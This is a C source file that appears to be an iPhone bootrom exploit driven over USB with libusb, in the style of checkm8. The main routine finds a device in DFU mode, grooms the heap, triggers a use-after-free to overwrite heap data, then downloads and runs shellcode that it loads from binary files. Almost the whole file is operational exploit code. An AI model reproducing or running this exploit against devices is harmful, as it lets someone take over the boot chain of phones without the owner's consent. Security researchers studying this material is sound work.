// gcc -Wall -o3 ./exploit -L/opt/pkg/lib -lusb-1.0 -I/opt/pkg/include -I. main.c

#include "inc/exploit.h"

#define apple_vendor_id 0x5AC
#define apple_product_id 0x1227

#define heap_hole 6

/*
*   Searches for an iPhone in DFU mode
*/
static libusb_device_handle *get_iphone()
{
    libusb_device_handle *device_handle = NULL;
    time_t start = time(NULL);
    while ((device_handle == NULL) && (time(NULL) - start < 3))
    {
        device_handle = libusb_open_device_with_vid_pid(NULL, apple_vendor_id, apple_product_id);
    }
    assert(device_handle != NULL);
    return device_handle;
}

int main()
{
    struct timespec sleep;
    sleep.tv_sec = 0;
    sleep.tv_nsec = 500000000;
    int i;
    libusb_init(NULL);
    int64_t p_length = 0;
    uint8_t *payload = get_payload(&p_length, "./bin/bootrom_shellcode.text", "./bin/boot_companion.text");
    heap_overwrite overwrite = get_overwrite();

    libusb_device_handle *device_handle = NULL;
    printf("[.] Payload          0x%llx\n", p_length);
    printf("[.] Overwrite offset 0x%llx\n", overwrite.advance_length);
    printf("[.] Overwrite length 0x%llx\n", overwrite.overwrite_length);
    device_handle = get_iphone();

    puts("[*] Feng Shui");
    stall_data_and_leak(device_handle);
    for (i = 0; i < heap_hole; i++)
        dont_leak(device_handle);
    leak(device_handle);
    dont_leak(device_handle);
    libusb_reset_device(device_handle);
    libusb_close(device_handle);

    puts("[*] io_buffer free");
    device_handle = get_iphone();
    set_length(device_handle, 0x800);
    transfer(device_handle, false, 0, 0, 0, 0, overwrite.advance_length, overwrite.advance);
    dfu_abort(device_handle);
    libusb_close(device_handle);

    nanosleep(&sleep, NULL);

    puts("[*] Use After Free");
    device_handle = get_iphone();
    stall_only(device_handle);
    leak(device_handle);
    transfer(device_handle, false, 0, 0, 0, 0, overwrite.overwrite_length, overwrite.overwrite);

    puts("[*] Downloading payload to device");
    for (i = 0; p_length - i >= 0x800; i += 0x800)
    {
        download_to_device(device_handle, payload + i, 0x800);
    }
    if (p_length - i > 0)
        download_to_device(device_handle, payload + i, p_length - i);
    puts("[*] Resetting device");

    puts("[*] Shellcode will now execute");
    libusb_reset_device(device_handle);
    puts("[*] Shellcode executed");
    libusb_close(device_handle);

    puts("[*] Booting...");
    device_handle = get_iphone();
    dfu_abort(device_handle);
    puts("DONE");
    return 0;
}